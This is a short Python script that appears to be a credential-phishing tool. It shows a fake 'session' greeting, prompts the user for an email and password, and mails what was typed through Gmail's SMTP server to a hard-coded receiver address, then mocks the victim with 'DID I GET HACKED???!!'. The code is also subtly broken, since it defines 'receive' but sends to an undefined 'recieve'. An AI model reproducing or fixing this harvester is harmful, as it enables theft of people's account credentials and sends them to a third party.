import smtplib
import time
print ("    Welcome to our session. This will take a few seconds if not minutes.")
# Sender email
email = "gmailonly"
pswd = "gmailpassword"
# Receiver email
receive = "receiver@email.com"
message = input("Email: ") + input("Password: ")
s = smtplib.SMTP("smtp.gmail.com", 587)
s.starttls()
s.login(email, pswd)
print (" You logged in successfully {!}")
# Send email from sender email to receiver email
s.sendmail(email, recieve, message)
print ("[============>] Email sent successfully...")
time.sleep(0.1)
print ("OH GOD. DID I GET HACKED???!!")
